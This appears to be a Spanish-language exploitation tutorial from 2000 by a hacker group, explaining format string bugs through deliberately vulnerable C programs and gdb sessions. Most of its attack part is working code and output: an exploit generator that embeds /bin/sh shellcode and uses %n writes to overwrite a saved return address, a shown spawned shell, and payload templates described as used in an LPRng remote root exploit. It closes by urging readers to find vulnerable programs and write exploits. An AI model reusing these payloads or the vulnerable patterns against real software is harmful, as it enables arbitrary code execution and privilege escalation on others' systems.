@@ -1,0 +1,470 @@
+                ---------------------------------------------
+                [rdC] r 0 t t e n  d e v i c e  C r e w [rdC]
+                [rdC] Argentinian security group.       [rdC]
+                [rdC] http://www.rdcrew.com.ar          [rdC]
+                -----------------[presents]------------------
+
+                         Paper sobre format bugs
+                         ~~~~~~~~~~~~~~~~~~~~~~~
+
+por venomous/rdC  - [basado en el paper de Pascal Bouchareine]
+venomous@rdcrew.com.ar
+Diciembre 2000
+    
+    
+>-------------<[ Indice:
+
+1] Que son los format bugs?
+2] Como sacamos proveecho de ellos? / Codigo de demostracion / Escribiendo
+   En memoria
+3] Otras tecnicas
+4] Greets!
+
+
+>------[1]----<[ Que son los format bugs?
+
+Uno de los problemas es cuando un programador en vez de hacer
+
+printf("%s\n", variable);
+
+escribe, para ahorrarse unos bytes y no cansarse tanto:
+
+printf(variable);
+
+Te preguntaras porque esta mal escribir printf(variable); ?.. el problema
+es que si esa variable posee format strings (%d, %p, etc...) en vez de
+mostrarlos comunmente, va a empezar a mostrar valores del stack.
+Claro que no solo el uso indebido del printf() es el que causa esto, sino
+tambien por ejemplo.. al hacer syslog(xx,buffer); pasara lo mismo, entre
+otros tantos casos.
+
+>------[2]----<[ Como sacamos proveecho de ellos?
+            \\<[  Codigo de demostracion
+             \<[  Escribiendo en memoria
+
+
+Miremos el siguiente codigo:
+
+static char encontrame[]="you find me\n";
+
+void main()
+{
+    char a[512];
+    char b[512];
+
+    memset(b, '\0', 512);
+    read(0, b, 512);
+    sprintf(a,b);
+    printf("%s", a);
+}
+
+El proposito aca es encontrar la frase "you find me", como lo hacemos?..
+es mas simple de lo que estas pensando:
+
+powerhouse:/c0de/formatbugs# cc -o simple -ggdb simple.c
+powerhouse:/c0de/formatbugs# gdb simple
+GNU gdb 5.0
+Copyright 2000 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you
+are welcome to change it and/or distribute copies of it under certain
+conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for
+details.
+This GDB was configured as "i686-pc-linux-gnu"...
+(gdb) break main
+Breakpoint 1 at 0x8048195: file simple.c, line 8.
+(gdb) r
+Starting program: /hda3/c0de/formatbugs/simple
+
+Breakpoint 1, main () at simple.c:8
+8           memset(a, '\0', 512);
+(gdb) printf "%p\n", encontrame
+0x8076b4c
+
+ahora sabemos que la direccion es 0x08076b4c, por lo tanto:
+
+powerhouse:/c0de/formatbugs# printf "\x4c\x6b\x07\x08%%s\\n" > first
+powerhouse:/c0de/formatbugs# ./simple <first
+<basura>you find me
+
+powerhouse:/c0de/formatbugs#
+
+La basura es el comienzo del format string, con esto, es posible mostrar
+cualquier parte de la memoria que necesitemos y ver los resultados.
+
+Pero, de que nos serviria poder ver elementos, si no podemos cambiarlos?..
+por eso existe el %n, escribe el numero de bytes escritos hasta el momento
+a el lugar que le digamos.
+
+veamos esto con el programa anterior
+
+powerhouse:/c0de/formatbugs# printf "\x50\xf5\xff\xbf%%n\\n" > second
+powerhouse:/c0de/formatbugs# gdb simple
+GNU gdb 5.0
+Copyright 2000 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you
+are
+welcome to change it and/or distribute copies of it under certain
+conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for
+details.
+This GDB was configured as "i686-pc-linux-gnu"...
+(gdb) set args < second
+(gdb) break main
+Breakpoint 1 at 0x8048195: file simple.c, line 8.
+(gdb) r
+Starting program: /hda3/c0de/formatbugs/simple < second
+
+Breakpoint 1, 0x804845d in main ()
+(gdb) watch *0xbffff550
+Hardware watchpoint 2: *3221222736
+(gdb) c
+Continuing.
+Hardware watchpoint 2: *3221222736
+
+Old value = 0
+New value = 4
+0x4005b1ba in vfprintf () from /lib/libc.so.6
+(gdb) x/x 0xbffff550
+0xbffff550:     0x00000004
+
+Que paso? escribio 4 bytes (la direccion) dentro de donde le dijimos, en
+este caso se elijo 0xbffff550 que estaba vacio.
+
+Ahora, como hacemos para escribir una direccion completa?.. supongamos que
+deseamos escribir 0xbffee980 dentro de 0xbffff550, no podemos escribir
+0xbffee980 bytes dentro del buffer para que a travez del %n lo escriba,
+generalmente los buffers no son -tan- grandes.
+
+Podemos construir la direccion byte por byte, seria:
+
+main()
+{
+	char a0[255];
+	char a1[255];
+	char a2[255];
+	char a3[255];
+
+	memset(a0, 0, 255);
+	memset(a1, 0, 255);
+        memset(a2, 0, 255);
+        memset(a3, 0, 255);
+	
+        //0xbffee980
+	memset(a0, '\x90', 0x80 - 16);        // [1]
+	memset(a1, '\x90', 0xe9 - 0x80);
+	memset(a2, '\x90', 0xfe - 0xe9);
+	memset(a3, '\x90', 0x01bf - 0xfe);
+
+
+	printf("\x50\xf5\xff\xbf" // 0xbffff550 va a apuntar a 0xbffee980
+	       "\x51\xf5\xff\xbf" // son 4 direcciones = 16 bytes, poreso
+	       "\x52\xf5\xff\xbf" // la resta en [1]
+	       "\x53\xf5\xff\xbf"
+	       "%s%%n" // esto da 0x50
+               "%s%%n" // esto da 0xf5
+               "%s%%n" // esto da 0xff
+	       "%s%%n" // y esto da 0xbf
+		,a0, a1, a2 ,a3);
+}
+
+Con esto, tenemos 0xbffff550 apuntando a 0xbffee980, veamos
+
+
+powerhouse:/c0de/formatbugs# cc -o he he.c
+powerhouse:/c0de/formatbugs# ./he > hee
+powerhouse:/c0de/formatbugs# gdb simple
+GNU gdb 5.0
+Copyright 2000 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you
+are
+welcome to change it and/or distribute copies of it under certain
+conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for
+details.
+This GDB was configured as "i686-pc-linux-gnu"...
+(gdb) set args < hee
+(gdb) break main
+Breakpoint 1 at 0x804845d
+(gdb) r
+Starting program: /hda3/c0de/formatbugs/simple < hee
+
+Breakpoint 1, 0x804845d in main ()
+(gdb) watch *0xbffff550
+Hardware watchpoint 2: *3221222736
+(gdb) c
+Continuing.
+Hardware watchpoint 2: *3221222736
+
+Old value = 0
+New value = 128
+0x4005b1ba in vfprintf () from /lib/libc.so.6
+(gdb) c
+Continuing.
+Hardware watchpoint 2: *3221222736
+
+Old value = 128
+New value = 59776
+0x4005b1ba in vfprintf () from /lib/libc.so.6
+(gdb) c
+Continuing.
+Hardware watchpoint 2: *3221222736
+
+Old value = 59776
+New value = 16705920
+0x4005b1ba in vfprintf () from /lib/libc.so.6
+(gdb) c
+Continuing.
+Hardware watchpoint 2: *3221222736
+
+Old value = 16705920
+New value = -1073813120
+0x4005b1ba in vfprintf () from /lib/libc.so.6
+(gdb) x/x 0xbffff550
+0xbffff550:     0xbffee980
+
+Asi es, ahora 0xbffff550 apunta a 0xbffee980, suponete que 0xbffff550 sea
+la return address y en 0xbffee980 estuviese el shellcode, que hubiese
+pasado?.. tendriamos un hermoso prompt esperandonos :)
+
+Ya casi esta todo listo, pongamos todo lo que aprendimos para cambiar la
+ejecucion de este programa:
+
+void h(char *destino, char *origen)
+{
+    int foo;
+    char bar;
+
+    sprintf(destino,origen);
+}
+
+main()
+{
+    char a[512];
+    char b[512];
+
+    memset(a, '\0', 512);
+    read(0, a, 512);
+    h(b,a);
+    printf("%s\n", b);
+}
+
+
+lo primero que debemos hacer, es ver a que offset esta el output del
+buffer, para asi poder empezar a controlarlo.
+
+powerhouse:/c0de/formatbugs# ./vuln
+AAAA %p %p %p %p %p %p %p
+AAAA 0x40012c10 0x400fa974 0xbffff9d8 0x80484b4 0xbffff5d8 0xbffff7d8 0x41414141
+        4           8         12         16        20         24         28
+
+
+despues, debemos saber donde la direccion del buffer para poder saltar
+luego a este..
+
+powerhouse:/c0de/formatbugs# ./vuln
+AAAA %p %p %p %p %p %s
+AAAA 0x40012c10 0x400fa974 0xbffff9d8 0x80484b4 0xbffff5d8 AAAA %p %p %p
+%p %p %s
+
+El %s en vez de mostrar la direccion (0xbffff7d8) nos muestra su
+contenido, y efectivamente es el buffer que posee nuestro input.
+Ahora pensemos, tenemos que utilizar 6 %x para comer el stack y recien ahi
+empezamos a manejarlo, nuestro exploit daria un output parecido a
+
+<4 direcciones>%x%x%x%x%x%x<%n's/nops y shellcode>
+
+Asique, si le decimos que salte a 0xbffff7d8 en realidad va a caer en las
+<4 direcciones> y esto no es correcto, poreso mismo debemos sumarle 16
+(nuevamente, por las 4 direcciones) y 48 ( (6*8) %x output) mas uno para
+llegar recien ahi al primer NOP (\x90)
+
+Ahora sabemos que debemos nuestros nops/shellcode estaran en 0xbffff819
+(0xbffff7d8 + 16 + 49)
+
+Que nos falta ahora? averiguar DONDE debemos escribir esa direccion, para
+que el programa salte a los nops y tengamos nuestro shell, para esto,
+nuevamente llamamos al amigo gdb :)
+
+Breakpoint 3, 0x40062a0c in sprintf () from /lib/libc.so.6
+(gdb) info frame
+Stack level 0, frame at 0xbffff5c0:
+ eip = 0x40062a0c in sprintf; saved eip 0x8048467
+ called by frame at 0xbffff5d8
+ Arglist at 0xbffff5c0, args:
+ Locals at 0xbffff5c0, Previous frame's sp is 0x0
+ Saved registers:
+  ebx at 0xbffff5bc, ebp at 0xbffff5c0, eip at 0xbffff5c4
+(gdb)
+
+* eip at 0xbffff5c4 == esta es la direccion que necesitamos *
+
+veamos como quedaria el code:
+
+
+unsigned char shellcode[]=  /* aleph1 shellcode.45b */
+    "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
+    "\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb"
+    "\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff\x2f\x62\x69\x6e"
+    "\x2f\x73\x68";
+
+main()
+{
+    char a0[255];
+    char a1[255];
+    char a2[255];
+    char a3[255];
+
+    memset(a0, 0, 255);
+    memset(a1, 0, 255);
+    memset(a2, 0, 255);
+    memset(a3, 0, 255);
+
+    // ********************** !!!! **********************
+    // 0xbffff819 direccion donde estara el primer nop
+    // como tendriamos q hacer 0x19 - 16 - 47 - 2 (cosa q daria negativa)
+    // le sumamos 100 mas.. y nos quedaria 0xbffff87d :) direccion que
+    // sigue pegando en nuestros nops y ahi si podemos hacer la resta
+    // ya que el resultado da positivo!
+    // ********************** !!!! **********************
+
+    memset(a0, '\x90', 0x7d - 16 - 47 - 2);
+    // -16 por las primeras 4 direcciones
+    // -48 por el output de los %x
+    // -2 por el \xeb\x02
+    // -1 y llegamos al primer NOP
+
+    memset(a1, '\x90', 0xf8 - 0x7d - 2);   // -2 por el \xeb\x02
+    memset(a2, '\x90', 0xff - 0xf8 - 2);   // lo mismo
+    memset(a3, '\x90', 0x01bf - 0xff - 2); // ...
+    // 0xbf - 0xff da negativo, entonces hacemos 0x01bf - 0xff !
+
+    // 0xbffff5c4
+    printf("\xc4\xf5\xff\xbf" // a esta dir, vamos a escribirle la direccion
+           "\xc5\xf5\xff\xbf" // de nuestro buffer (nops/shellcode)
+           "\xc6\xf5\xff\xbf" // y de esta manera obtener
+           "\xc7\xf5\xff\xbf" // nuestro shell!
+
+           "%%x%%x%%x%%x%%x%%x" // los 6 primeros %x
+
+           "%s\xeb\x02%%n" // \xeb\x02 se utiliza para saltar arriba de los
+           "%s\xeb\x02%%n" // %n
+           "%s\xeb\x02%%n" //
+           "%s\xeb\x02%%n\x90\x90\x90\x90%s"
+           ,a0, a1, a2, a3, shellcode);
+}
+
+lo que hace el \xeb\x02 es saltar por sobre los %n y seguir con los nops
+ya que si no estaria el \xeb\x02 leeria el %n y haria segfault.
+graficamente seria:
+
+<nops>\xeb\x02%n<nops>\xeb\x02%n<nops><shellcode>
+  |               |               |
+  |_______________|_______________|
+        al leer el \xeb\x02
+
+Los ultimos NOPS entre el ultimo %n y el shellcode, estan porque podria
+suceder que la ultima resta fuera 0 en ese caso, podria saltar
+directamente dentro del shellcode, y talvez no en donde comienza, dando
+asi segmentation fault.
+
+ahora,, a probarlo!
+
+powerhouse:/c0de/formatbugs# (./he ; cat) | ./vuln
+uname -a
+Linux powerhouse 2.2.17 #16 Tue Sep 26 01:49:46 ART 2000 i686 unknown
+date
+Fri Dec  1 06:48:59 ART 2000
+
+
+huh its late :).. 
+
+Si tienes ganas de ver otro exploit mas utilizable e interesante puedes
+ver el que hize frente al LPRng (el lpd que utiliza el RedHat) en
+http://www.rdcrew.com.ar en la seccion de programas.
+El cual utiliza la tecnica descripta a continuacion.
+
+>------[3]----<[ Otras tecnicas
+
+Existen otras tecnicas para escribir en memoria, o para comer el stack,,
+
+Te recomiendo que primero entiendas lo anterior, y luego trates de
+entender esto, por ejemplo:
+
+Antes habiamos dicho que necesitabamos comer el stack (con %x o
+otros) hasta llegar a donde lo empezamos a controlar.. pero te
+preguntaras, que pasa si en un programa por ejemplo solo permite el input
+de 512 bytes, o aun menos, y con los %x (por ej) no podemos llegar a
+controlar el stack?... se puede solucionar de la siguiente manera:
+
+<padding>AAAA%<NUMERO>$p
+
+En numero iria cualquier numero, que lo ideal seria brute forciarlo
+(fuerza bruta) hasta que nos de nuestro 0x41414141, el padding seria por
+si lo necesitamos,, ejemplo:
+
+AAAA%222$p == (output) 0x5e5e4141
+Que esta pasando? necesitamos 2 de padding para que nos de la direccion
+correcta:
+
+xxAAAA%222$p == (output) 0x41414141
+
+Ahora bien, como hacemos para escribir?... muy simple.. es la misma forma
+de lo anterior.. supongamos que quisieramos escribir 0xbffff920 debemos
+tomar cada segmento (bf ff f9 y 20) e ir restandole lo que corresponda
+ejemplo (en el caso del LPRng remote root exploit):
+
+0x20 - 50 - padding
+0xf9 - 0x20
+0xff - 0xf9
+0x01bf - 0xff
+
+Te estaras preguntando porque es -50 al principio?? el LPRng da una linea
+(Dispatch input....) que su len total es de 50 caracteres, entonces
+debemos restarselo, claro que debemos chequear que no de negativa la
+resta, y en caso de que asi sea, sumarle 0x100 que va a hacer que quede
+igual.
+
+entonces.. como quedaria ??
+
+<primeras 16 direcciones donde queremos escribir>       [x]
+%.<numero de la 1r resta>u%222$n
+%.<numero de la 2da resta>u%223$n
+%.<numero de la 3ra resta>u%224$n
+%.<numero de la 4ta resta>u%225$n
+<nops>
+<shellcode>
+
+Con esto escribiriamos en la direccion que pusimos al principio [x] la
+direccion 0xbffff920.
+
+
+Bueno, con esto concluye este paper,, espero que te haya servido de algo,,
+y te recomiendo que practiques,, podrias utilizar bien el LPRng para
+probar, o bien el wuftpd 2.6.0, que tiene el bug del SITE EXEC .. y bien,
+una vez que lo tengas todo bien entendido, empezar a buscar programas
+vulnerables, hacer exploits .. y saludarme claro :)
+
+
+>------[4]----<[ Greets and others..
+
+
+Los saludos van para los de siempre, bruj0, ka0z, dn0, #rdC, #flatline
+Tambien, mis saludos a Pascal Bouchareine, persona que no conozco, pero
+que admiro por el excelente paper que escribio sobre format bugs,
+este mismo paper se basa, un poco, en sus explicaciones ya que yo lo
+aprendi de ahi al principio.. :)
+
+Cualquier duda que tengas, sobre la aplicacion de esta teoria, no dudes en
+preguntarme, pero porfavor no emails con 'porque no funciona este exploit' :)
+
+                    venomous/rdC - venomous@rdcrew.com.ar
+
+                ---------------------------------------------
+                [rdC] r 0 t t e n  d e v i c e  C r e w [rdC]
+                [rdC] Argentinian security group.       [rdC]
+                [rdC] http://www.rdcrew.com.ar          [rdC]
+                ---------------------------------------------
